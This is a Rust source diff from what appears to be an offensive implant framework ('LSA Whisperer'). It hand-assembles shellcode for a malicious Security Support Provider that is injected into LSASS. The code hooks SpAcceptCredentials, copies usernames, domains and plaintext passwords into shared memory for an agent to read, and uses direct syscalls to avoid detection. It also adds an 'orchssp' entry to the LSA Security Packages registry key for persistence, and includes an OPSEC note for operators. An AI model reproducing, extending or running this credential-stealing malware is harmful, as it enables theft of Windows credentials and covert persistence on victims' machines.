+    // Encoding: F0=LOCK, 0F C1 /r = XADD r/m32, r32
+    //   lock xadd dword [r14], ecx
+    //   → ecx = old write_index,  [r14] = old + 1
+    //
+    // After xadd, ecx holds the OLD index.  Compute the slot from it.
+    blob.extend_from_slice(&[0xB9, 0x01, 0x00, 0x00, 0x00]); // mov ecx, 1
+    // lock xadd [r14], ecx
+    blob.extend_from_slice(&[0xF0, 0x41, 0x0F, 0xC1, 0x0E]); // F0=LOCK 41=REX.B 0FC1=XADD /1=0E=[r14]
+
+    // ── Compute slot address from old index ────────────────────────
+    // slot_offset = (old_index % 256) * CRED_SLOT_SIZE(264)
+    blob.extend_from_slice(&[0x81, 0xE1, 0xFF, 0x00,
+                             0x00, 0x00]);                     // and ecx, 0x000000FF
+    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01,
+                             0x00, 0x00]);                     // imul ecx, ecx, 264
+    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]);       // lea rbx, [r14+16]  (slots start after 16-byte header)
+    blob.extend_from_slice(&[0x48, 0x03, 0xD9]);             // add rbx, rcx  → rbx = &CredSlot[slot]
+
+    // ── Zero the slot (33 qwords = 264 bytes) ─────────────────────
+    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
+    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
+    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
+    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq
+
+    // ═══════════════════════════════════════════════════════════════
+    //  Copy credential fields (V3-01 fix: two-level pointer deref)
+    //
+    //  For each field (DownlevelName, DomainName, Password):
+    //    1. Read the PUNICODE_STRING pointer from r13+offset
+    //    2. Read Length from [ptr+0x00]
+    //    3. Read Buffer from [ptr+0x08]
+    //    4. Copy min(Length, max_bytes) bytes from Buffer to slot
+    // ═══════════════════════════════════════════════════════════════
+
+    // ── Copy DownlevelName (PUNICODE_STRING at r13+0x08) ──────────
+    // Read pointer to UNICODE_STRING
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x08]);       // mov r12, [r13+0x08]     (4 bytes)
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12            (3 bytes)
+    // Sequence after jz (to skip_username):
+    //   movzx eax, word [r12+0x00]        6 bytes  (41 0F B7 44 24 00)
+    //   test eax, eax                     2 bytes  (85 C0)
+    //   jz +0x20                          2 bytes  (74 20)
+    //   cmp eax, 128                      5 bytes  (3D 80 00 00 00)
+    //   jbe +5                            2 bytes  (76 05)
+    //   mov eax, 128                      5 bytes  (B8 80 00 00 00)
+    //   mov ecx, eax                      2 bytes  (89 C1)
+    //   mov r12, [r12+0x08]               5 bytes  (49 8B 64 24 08)
+    //   test r12, r12                     3 bytes  (4D 85 E4)
+    //   jz +0x08                          2 bytes  (74 08)
+    //   mov rsi, r12                      3 bytes  (4C 89 E6)
+    //   mov rdi, rbx                      3 bytes  (48 89 DF)
+    //   rep movsb                         2 bytes  (F3 A4)
+    //   Total: 42 bytes → jz = 0x2A
+    blob.extend_from_slice(&[0x74, 0x2A]);                     // jz skip_username (42 bytes)
+    // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
+                             0x00]);                             // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
+    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+mov(3)+rep(2) = 32 → 0x20
+    blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_username (32 bytes to end of block)
+    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
+    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
+    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
+    // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
+                             0x08]);                             // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
+    // Inner skip: 3+3+2 = 8 bytes → jz = 0x08
+    blob.extend_from_slice(&[0x74, 0x08]);                     // jz skip_username
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
+    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
+    // skip_username:
+
+    // ── Copy DomainName (PUNICODE_STRING at r13+0x10) ─────────────
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
+    // Sequence after jz (to skip_domain):
+    //   movzx eax, word [r12+0x00]        6 bytes
+    //   test eax, eax                     2 bytes
+    //   jz +0x21                          2 bytes  (74 21)
+    //   cmp eax, 128                      5 bytes
+    //   jbe +5                            2 bytes
+    //   mov eax, 128                      5 bytes
+    //   mov ecx, eax                      2 bytes
+    //   mov r12, [r12+0x08]               5 bytes
+    //   test r12, r12                     3 bytes
+    //   jz +0x09                          2 bytes  (74 09)
+    //   mov rsi, r12                      3 bytes
+    //   lea rdi, [rbx+0x40]               4 bytes  (48 8D 7B 40)
+    //   rep movsb                         2 bytes
+    //   Total: 43 bytes → jz = 0x2B
+    blob.extend_from_slice(&[0x74, 0x2B]);                     // jz skip_domain (43 bytes)
+    // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
+                             0x00]);                             // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
+    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(4)+rep(2) = 33 → 0x21
+    blob.extend_from_slice(&[0x74, 0x21]);                     // jz skip_domain
+    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
+    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
+    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
+    // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
+                             0x08]);                             // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
+    // Inner skip: 3+4+2 = 9 bytes → jz = 0x09
+    blob.extend_from_slice(&[0x74, 0x09]);                     // jz skip_domain
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]);       // lea rdi, [rbx+0x40] (domain at slot+64)
+    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
+    // skip_domain:
+
+    // ── Copy Password (PUNICODE_STRING at r13+0x18) ───────────────
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x18]);       // mov r12, [r13+0x18]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
+    // Sequence after jz (to skip_password):
+    //   movzx eax, word [r12+0x00]        6 bytes
+    //   test eax, eax                     2 bytes
+    //   jz +0x24                          2 bytes
+    //   cmp eax, 256                      5 bytes
+    //   jbe +5                            2 bytes
+    //   mov eax, 256                      5 bytes
+    //   mov ecx, eax                      2 bytes
+    //   mov r12, [r12+0x08]               5 bytes
+    //   test r12, r12                     3 bytes
+    //   jz +0x0C                          2 bytes
+    //   mov rsi, r12                      3 bytes
+    //   lea rdi, [rbx+0x80]               7 bytes  (48 8D BB 80 00 00 00)
+    //   rep movsb                         2 bytes
+    //   Total: 46 bytes → jz = 0x2E
+    blob.extend_from_slice(&[0x74, 0x2E]);                     // jz skip_password (46 bytes)
+    // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
+                             0x00]);                             // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
+    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(7)+rep(2) = 36 → 0x24
+    blob.extend_from_slice(&[0x74, 0x24]);                     // jz skip_password
+    blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
+    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0xB8, 0x00, 0x01, 0x00, 0x00]); // mov eax, 256
+    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
+    // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
+                             0x08]);                             // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
+    // Inner skip: 3+7+2 = 12 bytes → jz = 0x0C
+    blob.extend_from_slice(&[0x74, 0x0C]);                     // jz skip_password
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x8D, 0xBB,
+                             0x80, 0x00, 0x00, 0x00]);         // lea rdi, [rbx+0x80] (password at slot+128)
+    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
+    // skip_password:
+
+    // ── Set flags = FLAG_PLAINTEXT (cred_type=0 already from zeroing) ──
+    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01,
+                             0x00, 0x00]);                     // inc dword [rbx+0x104]
+
+    // ── Memory barrier: ensure all CredSlot writes are visible before
+    // the count update.  mfence provides a full barrier (both loads
+    // and stores), stronger than sfence (stores only).  This ensures
+    // the agent-side reader in another process never observes the
+    // count increment before the slot data is committed.
+    // V3-05 fix: replaced sfence with mfence for correct ordering.
+    blob.extend_from_slice(&[0x0F, 0xAE, 0xF0]);             // mfence
+
+    // ── Increment count (atomic) ──────────────────────────────────
+    // V3-05 fix: we no longer update write_index here — lock xadd
+    // already did that atomically above.  Only count needs incrementing.
+    blob.extend_from_slice(&[0xF0, 0x41, 0xFF, 0x46, 0x08]); // lock inc dword [r14+8] (count)
+
+    // ── epilogue ──────────────────────────────────────────────────
+    // No NtUnmapViewOfSection or NtClose — the mapping persists.
+    let accept_epilogue = blob.len();
+    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
+    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x28
+    blob.extend_from_slice(&0x28u32.to_le_bytes());
+    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
+    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
+    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
+    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
+    blob.extend_from_slice(&[0x5F]);                         // pop rdi
+    blob.extend_from_slice(&[0x5E]);                         // pop rsi
+    blob.extend_from_slice(&[0x5B]);                         // pop rbx
+    blob.extend_from_slice(&[0x5D]);                         // pop rbp
+    blob.push(0xC3);                                         // ret
+
+    // ── Patch near jumps in SpAcceptCredentials ───────────────────
+    {
+        let target = accept_epilogue;
+        let rel32 = (target as i32) - (cred_jz_epilogue as i32 + 4);
+        blob[cred_jz_epilogue..cred_jz_epilogue + 4].copy_from_slice(&rel32.to_le_bytes());
+        let rel32 = (target as i32) - (base_jz_epilogue as i32 + 4);
+        blob[base_jz_epilogue..base_jz_epilogue + 4].copy_from_slice(&rel32.to_le_bytes());
+    }
+
+    // ── Data section (0x500) ──────────────────────────────────────
     blob.resize(OFF_DATA, 0x90);
     // Write the section name as UTF-16LE (including null terminator)
+    // shm_name was already set by SpInitialize above
     for &w in shm_name.iter() {
         blob.extend_from_slice(&w.to_le_bytes());
     }
+    // Reserve space for OFF_STORED_BASE (8 bytes, zeroed)
+    // The section name occupies at most ~80 bytes, so pad to 0x80 offset
+    // and ensure 8 bytes for the stored base address.
+    blob.resize(OFF_DATA + OFF_STORED_BASE + 8, 0x00);
     blob.resize(OFF_FT, 0x00);
 
-    // ── Function pointer table (0x400) ────────────────────────────
+    // ── Function pointer table (0x600) ────────────────────────────
     // Pre-resolve ntdll exports.  On Windows 10+ ntdll is at the same
     // base address in every process, so these addresses are valid in LSASS.
     let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
@@ -491,11 +704,13 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
             .ok_or_else(|| anyhow!("cannot resolve ntdll export '{}'", String::from_utf8_lossy(name)))
     };
 
+    let nt_create_section = resolve(b"NtCreateSection")?;
     let nt_open_section  = resolve(b"NtOpenSection")?;
     let nt_map_view      = resolve(b"NtMapViewOfSection")?;
     let nt_unmap_view    = resolve(b"NtUnmapViewOfSection")?;
     let nt_close         = resolve(b"NtClose")?;
 
+    blob.extend_from_slice(&nt_create_section.to_le_bytes());
     blob.extend_from_slice(&nt_open_section.to_le_bytes());
     blob.extend_from_slice(&nt_map_view.to_le_bytes());
     blob.extend_from_slice(&nt_unmap_view.to_le_bytes());
@@ -514,18 +729,21 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
 
 /// Trampoline table layout for SSP injection.
 ///
-/// The injector writes resolved function addresses into this table
-/// before injecting the SSP blob into LSASS.
+/// The first five fields mirror the function pointer table embedded in
+/// the SSP blob at `OFF_FT` (NtCreateSection..NtClose).  The remaining
+/// fields document additional syscall targets used by the injection
+/// helper (`inject_ssp_into_lsass`) that are resolved via SSN-based
+/// direct syscalls rather than through the in-blob table.
 #[repr(C)]
 pub struct TrampolineTable {
     pub nt_create_section: usize,
+    pub nt_open_section: usize,
     pub nt_map_view_of_section: usize,
     pub nt_unmap_view_of_section: usize,
     pub nt_close: usize,
     pub nt_allocate_virtual_memory: usize,
     pub nt_write_virtual_memory: usize,
     pub nt_create_thread_ex: usize,
-    pub _reserved: [usize; 1],
 }
 
 // ── Reflective SSP DLL builder ─────────────────────────────────────────────
@@ -702,6 +920,12 @@ pub fn read_captured_credentials(
     let shm_slice = unsafe {
         std::slice::from_raw_parts(base_addr as *const u8, SHM_SIZE)
     };
+
+    // Acquire fence: ensures we see the most recent write_index / count
+    // values written by the SSP in LSASS.  On x86-64 TSO this is largely
+    // a no-op (loads are not reordered with other loads), but the fence
+    // makes the intent explicit and is necessary on ARM64 if ever ported.
+    std::sync::atomic::fence(std::sync::atomic::Ordering::Acquire);
 
     let write_idx = u32::from_le_bytes(shm_slice[0..4].try_into().unwrap_or([0; 4])) as usize;
     let read_idx = u32::from_le_bytes(shm_slice[4..8].try_into().unwrap_or([0; 4])) as usize;
@@ -1066,5 +1290,181 @@ pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> 
     }
 
     log::info!("LSA Whisperer: freed LSASS memory at {:#x}", base_addr);
+    Ok(())
+}
+
+// ── SSP package registration ───────────────────────────────────────────────
+
+/// The internal SSP package name used for LSA registration.
+///
+/// This must be a short ASCII string that will appear in the
+/// `Security Packages` registry value.  LSA uses this name to locate
+/// the SSP DLL — but since we inject directly into LSASS memory, LSA
+/// never loads us through this path.  Registration is still desirable
+/// so that LSA calls `SpAcceptCredentials` through its normal SSP
+/// dispatch after the next LSA service restart.
+const SSP_PACKAGE_NAME: &str = "orchssp";
+
+/// Register the SSP package with LSA by appending the package name to
+/// the `Security Packages` value in the LSA registry key.
+///
+/// # What this does
+///
+/// Appends `SSP_PACKAGE_NAME` to the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
+/// `REG_MULTI_SZ` value.  After the next LSA restart (or a call to
+/// `AddSecurityPackage`), LSA will attempt to load an SSP DLL with
+/// this name.  Since we have already injected our shellcode blob
+/// directly into LSASS, the in-memory hook intercepts credential
+/// callbacks regardless of whether the DLL file exists on disk.
+///
+/// # Why registry + injection
+///
+/// The pure injection approach works immediately but is volatile — it
+/// disappears when LSASS restarts.  The registry entry ensures
+/// persistence: on reboot, LSA will try to load the named SSP.  If
+/// the DLL is not on disk, the load silently fails, but our
+/// injection framework will re-inject on the next agent cycle.
+///
+/// # OPSEC note
+///
+/// Modifying this registry key is a well-known indicator.  Operators
+/// should weigh persistence vs. detection risk.  Set
+/// `register_with_lsa = false` in the profile to skip this step.
+pub fn register_ssp_package() -> Result<()> {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+
+    const LSA_KEY: &str = r"SYSTEM\CurrentControlSet\Control\Lsa";
+    const LSA_VALUE: &str = "Security Packages";
+
+    // Open the LSA registry key.
+    let key_wide: Vec<u16> = OsStr::new(LSA_KEY).encode_wide().chain(std::iter::once(0)).collect();
+    let val_wide: Vec<u16> = OsStr::new(LSA_VALUE).encode_wide().chain(std::iter::once(0)).collect();
+    let pkg_wide: Vec<u16> = OsStr::new(SSP_PACKAGE_NAME).encode_wide().chain(std::iter::once(0)).collect();
+
+    let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
+    let err = unsafe {
+        winapi::um::winreg::RegOpenKeyExW(
+            winapi::um::winnt::HKEY_LOCAL_MACHINE,
+            key_wide.as_ptr(),
+            0,
+            winapi::um::winnt::KEY_QUERY_VALUE | winapi::um::winnt::KEY_SET_VALUE,
+            &mut hkey,
+        )
+    };
+    if err != winapi::shared::minwindef::ERROR_SUCCESS {
+        return Err(anyhow!(
+            "RegOpenKeyExW({LSA_KEY}) failed: win32 error {err:#x}"
+        ));
+    }
+
+    // Read the current REG_MULTI_SZ value.
+    let mut buf_len: u32 = 0;
+    let mut reg_type: u32 = 0;
+    unsafe {
+        winapi::um::winreg::RegQueryValueExW(
+            hkey,
+            val_wide.as_ptr(),
+            std::ptr::null_mut(),
+            &mut reg_type,
+            std::ptr::null_mut(),
+            &mut buf_len,
+        )
+    };
+
+    // Allocate buffer and read.
+    let mut buf: Vec<u8> = vec![0u8; buf_len as usize + (pkg_wide.len() * 2 + 2)];
+    unsafe {
+        winapi::um::winreg::RegQueryValueExW(
+            hkey,
+            val_wide.as_ptr(),
+            std::ptr::null_mut(),
+            &mut reg_type,
+            buf.as_mut_ptr(),
+            &mut buf_len,
+        )
+    };
+
+    // Parse the existing REG_MULTI_SZ: sequence of null-terminated UTF-16LE
+    // strings, terminated by an extra null.
+    let existing_wide: Vec<u16> = buf[..buf_len as usize]
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+
+    // Check if our package name is already present.
+    let mut already_registered = false;
+    {
+        let mut start = 0;
+        while start < existing_wide.len() {
+            let end = existing_wide[start..].iter().position(|&w| w == 0);
+            match end {
+                Some(0) => break, // double-null terminator
+                Some(len) => {
+                    let s: String = String::from_utf16_lossy(&existing_wide[start..start + len]);
+                    if s.eq_ignore_ascii_case(SSP_PACKAGE_NAME) {
+                        already_registered = true;
+                        break;
+                    }
+                    start += len + 1;
+                }
+                None => break,
+            }
+        }
+    }
+
+    if already_registered {
+        log::info!("LSA Whisperer: SSP package '{SSP_PACKAGE_NAME}' already registered");
+        unsafe { winapi::um::winreg::RegCloseKey(hkey); }
+        return Ok(());
+    }
+
+    // Append our package name to the REG_MULTI_SZ.
+    // Build the new value: existing data + new null-terminated string + final null.
+    let mut new_value: Vec<u16> = existing_wide.clone();
+    // Ensure the existing data ends with exactly one null (between strings).
+    if !new_value.is_empty() && new_value.last() == Some(&0) {
+        // Remove trailing double-null if present.
+        while new_value.last() == Some(&0) {
+            new_value.pop();
+        }
+        new_value.push(0); // single null separator
+    }
+    // Append our package name + null.
+    for &w in &pkg_wide {
+        new_value.push(w);
+    }
+    new_value.push(0); // final null terminator for REG_MULTI_SZ
+
+    let new_bytes = unsafe {
+        std::slice::from_raw_parts(
+            new_value.as_ptr() as *const u8,
+            new_value.len() * 2,
+        )
+    };
+
+    let err = unsafe {
+        winapi::um::winreg::RegSetValueExW(
+            hkey,
+            val_wide.as_ptr(),
+            0,
+            winapi::um::winnt::REG_MULTI_SZ,
+            new_bytes.as_ptr(),
+            new_bytes.len() as u32,
+        )
+    };
+
+    unsafe { winapi::um::winreg::RegCloseKey(hkey); }
+
+    if err != winapi::shared::minwindef::ERROR_SUCCESS {
+        return Err(anyhow!(
+            "RegSetValueExW(Security Packages) failed: win32 error {err:#x}"
+        ));
+    }
+
+    log::info!(
+        "LSA Whisperer: registered SSP package '{SSP_PACKAGE_NAME}' in LSA Security Packages"
+    );
+
     Ok(())
 }
